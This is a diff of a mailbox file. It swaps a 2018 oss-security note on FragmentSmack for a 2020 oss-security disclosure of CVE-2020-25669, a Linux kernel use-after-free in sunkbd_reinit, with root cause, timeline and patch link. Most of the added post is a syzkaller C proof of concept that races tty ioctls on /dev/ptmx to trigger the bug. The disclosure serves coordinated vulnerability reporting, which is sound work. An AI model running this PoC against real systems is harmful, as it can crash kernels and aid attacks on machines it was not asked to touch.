@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1230" "Wednesday" "15" "August" "2018" "12:06:54" "+0200" "Marcus Meissner" "meissner@suse.de" "<20180815100654.vr67od6epctljw7v@suse.de>" "40" "Re: [oss-security] CVE-2018-5391: Linux kernel: IP fragments with random offsets allow a remote denial of service (FragmentSmack)" nil nil nil "8" "2018081510:06:54" "[oss-security] CVE-2018-5391: Linux kernel: IP fragments with random offsets allow a remote denial of service (FragmentSmack)" (number mark "U       meissner@sus Aug 15   40/1230  " thread-indent "\"Re: [oss-security] CVE-2018-5391: Linux kernel: IP fragments with random offsets allow a remote denial of service (FragmentSmack)\"\n") "<CAPdG+L40W-nprsiRV_bw68HP-eJ9u6F=sfXS39UJgJAd2TkuNg@mail.gmail.com>" ("<1545879296.2548069.1534278208403.JavaMail.zimbra@redhat.com>" "<334572023.2548916.1534278651965.JavaMail.zimbra@redhat.com>" "<CAPdG+L40W-nprsiRV_bw68HP-eJ9u6F=sfXS39UJgJAd2TkuNg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5293" "Friday" "20" "November" "2020" "22:41:54" "+0800" "- Nop" "nopitydays@gmail.com" "<CA+-U7QAmO3QQc--t0rQrMC3qwLbKpxpWPH6GPm5LK_0q=40pog@mail.gmail.com>" "224" "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil "11" "2020112014:41:54" "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" (number mark "U       nopitydays@g Nov 20  224/5293  " thread-indent "\"[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit\"\n") "<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>" ("<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>") nil nil nil nil nil nil nil "[oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7602 invoked by uid 550); 15 Aug 2018 10:07:07 -0000
+Received: (qmail 3885 invoked by uid 550); 20 Nov 2020 14:58:58 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,63 +12,264 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7583 invoked from network); 15 Aug 2018 10:07:06 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Date: Wed, 15 Aug 2018 12:06:54 +0200
-From: Marcus Meissner <meissner@suse.de>
-To: oss-security@lists.openwall.com
-Message-ID: <20180815100654.vr67od6epctljw7v@suse.de>
-References: <1545879296.2548069.1534278208403.JavaMail.zimbra@redhat.com>
- <334572023.2548916.1534278651965.JavaMail.zimbra@redhat.com>
- <CAPdG+L40W-nprsiRV_bw68HP-eJ9u6F=sfXS39UJgJAd2TkuNg@mail.gmail.com>
+Received: (qmail 32269 invoked from network); 20 Nov 2020 14:42:17 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
+        bh=1uhpKcTs3BE3w0HpPUNlj4c6kMM7yWeltinMlaBeHeA=;
+        b=KGXqV8ZIdoKKa2nsq4wGs70mSOF5tdWddURY120FDLS2Idg7zgtkRd94fB/4CjEU8a
+         7nKa2fgX8HeUdUQSVz+9zpaovpCQCMGznSlXTlriea2lYmzhdChXbvpNQYGOSb6v/V5W
+         GqjxtM0d9+IsqKxpe3ZyaXkmlgHObP+xHipoRtP8Ffohg1NVSAIrRUuh1LF8FP4dcWEg
+         MZtb5PLiOyv4y7IB13oExRGPwEHcFChANV/TRkttfTMX1DjK3MUUIVO3aPuSSS+g67fU
+         CVkRxuyBZxuRiCQpbT4uzndO3OSyl1BFez5QJjtx5WrohsrqwmdnjyToZ9zb/Ux0Xcd6
+         Q2eQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to;
+        bh=1uhpKcTs3BE3w0HpPUNlj4c6kMM7yWeltinMlaBeHeA=;
+        b=mbU974d3i1TBJrJCajxdANOxkOXVPa+nAY6n53H4f+EOG9FBsl0AsYKKl3JbBSM7vy
+         rN+eRDXgNH4hxZA3XpeQ9n48vwoMApiV759Ycqg0hROFjKBiGqor8SUyn5uJpWZchQwI
+         JYMBpoFL5aONGEtKajcedwoQnrLmQfC+4ZtzMeSd9PiIu7FtxISPHS/BpUCRWqoIFev4
+         BTguPNpmnQx9QTOlTfc5iEfOJUZ55aUOCD+N17jOXWRGdFOMDXlc4CcRRO/2AeQUzuRa
+         shRPSFbEiAaKHdh84ObF7NumETDwf7EiQHaCCBpEZ1YhwvXnivsnblbJXMoDhYYEXiOZ
+         A2KQ==
+X-Gm-Message-State: AOAM532JSBBqg+ZoXl0oBjY9Q9ZuS2eOBsbwie8oQVSOtr2C0ewbydMS
+	i5YCpZi49A5Niq8+Ut1/gRQ1V2buLfGJTjk1qiePFCdqwj4tgQ==
+X-Google-Smtp-Source: ABdhPJzjGFNh4OltaZ2VZ0Q7kusBSZJUYtcPHydXDiNUw0yfMMAMsJiXd9NmkTOEfy09NArgmwtd8PzvXdhnj2pvJCk=
+X-Received: by 2002:a1c:3b07:: with SMTP id i7mr10615432wma.118.1605883325830;
+ Fri, 20 Nov 2020 06:42:05 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAPdG+L40W-nprsiRV_bw68HP-eJ9u6F=sfXS39UJgJAd2TkuNg@mail.gmail.com>
-Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
- =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Graham_Norton=2C_HRB_212?=
- =?iso-8859-1?Q?84_=28AG_N=FCrnberg=29?=
-User-Agent: NeoMutt/20170421 (1.8.2)
-Subject: Re: [oss-security] CVE-2018-5391: Linux kernel: IP fragments with
- random offsets allow a remote denial of service (FragmentSmack)
+References: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
+In-Reply-To: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
+From: - Nop <nopitydays@gmail.com>
+Date: Fri, 20 Nov 2020 22:41:54 +0800
+Message-ID: <CA+-U7QAmO3QQc--t0rQrMC3qwLbKpxpWPH6GPm5LK_0q=40pog@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="0000000000002fd8fa05b48ad90e"
+Subject: [oss-security] Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit
+
+--0000000000002fd8fa05b48ad90e
+Content-Type: text/plain; charset="UTF-8"
 
 Hi,
 
-no.
+Patch for this issue is available at
+https://github.com/torvalds/linux/commit/77e70d351db7de07a46ac49b87a6c3c7a60fca7e
 
-SegmentSmack affects TCP segments,
-FragmentSmack affects IP fragments (lower protocol level).
+Regards,
+Bodong Zhao
 
-Ciao, Marcus
-On Tue, Aug 14, 2018 at 05:09:38PM -0400, David T. wrote:
-> Is this the same as "SegmentSmack" that came out last week, CVE-2018-5390?
-> Or, what is the difference?
-> 
-> On Tue, Aug 14, 2018 at 16:31 Vladis Dronov <vdronov@redhat.com> wrote:
-> 
-> > Heololo,
-> >
-> > A flaw named FragmentSmack was found in the way the Linux kernel handled
-> > reassembly of fragmented IPv4 and IPv6 packets. A remote attacker could
-> > use this flaw to trigger time and calculation expensive fragment reassembly
-> > algorithms by sending specially crafted packets which could lead to a CPU
-> > saturation and hence a denial of service on the system.
-> >
-> > External References:
-> >
-> > https://www.kb.cert.org/vuls/id/641765
-> >
-> > https://access.redhat.com/articles/3553061
-> >
-> > https://bugzilla.redhat.com/show_bug.cgi?id=1609664
-> >
-> > Best regards,
-> > Vladis Dronov | Red Hat, Inc. | Product Security Engineer
-> >
-> -- 
-> Very respectfully,
-> 
-> David M Thomsen
+On Thu, Nov 5, 2020 at 9:52 AM - Nop <nopitydays@gmail.com> wrote:
 
--- 
-Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@suse.de>
+> Hi,
+>
+> We found a use-after-free read in sunkbd_reinit located in
+> drivers/input/keyboard/sunkbd.c,
+> and reproduced it in the latest kernel version (v5.9.4 for now) with
+> CONFIG_KEYBOARD_SUNKBD=y and CONFIG_KASAN=y.
+>
+> The root cause of this BUG is :
+>
+> The function sunkbd_reinit having been scheduled by sunkbd_interrupt
+> before the struct sunkbd being freed.
+> Though the dangling pointer is set to NULL in sunkbd_disconnect, there is
+> still an alias in sunkbd_reinit thus causing UAF.
+>
+> Timeline:
+> * 2020/10/21 - Vulnerability reported to security@kernel.org.
+> * 2020/10/27 - Vulnerability reported to linux-distros@vs.openwall.org.
+> * 2020/10/27 - CVE-2020-25669 assigned.
+> * 2020/11/05 - Vulnerability opened.
+>
+> Regards,
+> Bodong Zhao from Tsinghua University
+>
+> ------------------------------------
+> PoC:
+>
+> // autogenerated by syzkaller (https://github.com/google/syzkaller)
+> // nop@THU
+> #define _GNU_SOURCE
+>
+> #include <endian.h>
+> #include <errno.h>
+> #include <pthread.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <time.h>
+> #include <unistd.h>
+> #include <fcntl.h>
+>
+> #include <linux/futex.h>
+>
+> static void sleep_ms(uint64_t ms)
+> {
+>   usleep(ms * 1000);
+> }
+>
+> static uint64_t current_time_ms(void)
+> {
+>   struct timespec ts;
+>   if (clock_gettime(CLOCK_MONOTONIC, &ts))
+>     exit(1);
+>   return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+> }
+>
+> static void thread_start(void* (*fn)(void*), void* arg)
+> {
+>   pthread_t th;
+>   pthread_attr_t attr;
+>   pthread_attr_init(&attr);
+>   pthread_attr_setstacksize(&attr, 128 << 10);
+>   int i;
+>   for (i = 0; i < 100; i++) {
+>     if (pthread_create(&th, &attr, fn, arg) == 0) {
+>       pthread_attr_destroy(&attr);
+>       return;
+>     }
+>     if (errno == EAGAIN) {
+>       usleep(50);
+>       continue;
+>     }
+>     break;
+>   }
+>   exit(1);
+> }
+>
+> typedef struct {
+>   int state;
+> } event_t;
+>
+> static void event_init(event_t* ev)
+> {
+>   ev->state = 0;
+> }
+>
+> static void event_reset(event_t* ev)
+> {
+>   ev->state = 0;
+> }
+>
+> static void event_set(event_t* ev)
+> {
+>   if (ev->state)
+>     exit(1);
+>   __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
+>   syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
+> }
+>
+> static void event_wait(event_t* ev)
+> {
+>   while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
+>     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
+> }
+>
+> static int event_isset(event_t* ev)
+> {
+>   return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
+> }
+>
+> static int event_timedwait(event_t* ev, uint64_t timeout)
+> {
+>   uint64_t start = current_time_ms();
+>   uint64_t now = start;
+>   for (;;) {
+>     uint64_t remain = timeout - (now - start);
+>     struct timespec ts;
+>     ts.tv_sec = remain / 1000;
+>     ts.tv_nsec = (remain % 1000) * 1000 * 1000;
+>     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0,
+> &ts);
+>     if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
+>       return 1;
+>     now = current_time_ms();
+>     if (now - start > timeout)
+>       return 0;
+>   }
+> }
+>
+> struct thread_t {
+>   int created, call;
+>   event_t ready, done;
+> };
+>
+> static struct thread_t threads[2];
+> static void execute_call(int call);
+> static int running;
+>
+> static void* thr(void* arg)
+> {
+>   struct thread_t* th = (struct thread_t*)arg;
+>   for (;;) {
+>     event_wait(&th->ready);
+>     event_reset(&th->ready);
+>     execute_call(th->call);
+>     __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
+>     event_set(&th->done);
+>   }
+>   return 0;
+> }
+>
+> static void loop(void)
+> {
+>   int i, call, thread;
+>   for (call = 0; call < 2; call++) {
+>     for (thread = 0; thread < (int)(sizeof(threads) / sizeof(threads[0]));
+>          thread++) {
+>       struct thread_t* th = &threads[thread];
+>       if (!th->created) {
+>         th->created = 1;
+>         event_init(&th->ready);
+>         event_init(&th->done);
+>         event_set(&th->done);
+>         thread_start(thr, th);
+>       }
+>       if (!event_isset(&th->done))
+>         continue;
+>       event_reset(&th->done);
+>       th->call = call;
+>       __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
+>       event_set(&th->ready);
+>       event_timedwait(&th->done, 45);
+>       break;
+>     }
+>   }
+>   for (i = 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
+>     sleep_ms(1);
+> }
+>
+> uint64_t fd;
+> char buf[100];
+>
+> void execute_call(int call)
+> {
+>   int disc = 0x2;
+>   char ch = 0xff;
+>
+>   switch (call) {
+>   case 0:
+>     // call sunkbd_disconnect
+>     read(fd, buf, 0);
+>     break;
+>   case 1:
+>     // call sunkbd_interrupt
+>     ioctl(fd, 0x5412, &ch); // TIOCSTI
+>     break;
+>   }
+> }
+> int main(void)
+> {
+>   int disc = 0x2;
+>   fd = open("/dev/ptmx", O_RDWR, 0);
+>   ioctl(fd, 0x5423, &disc); // TIOCSETD
+>   loop();
+>   return 0;
+> }
+>
+
+--0000000000002fd8fa05b48ad90e--
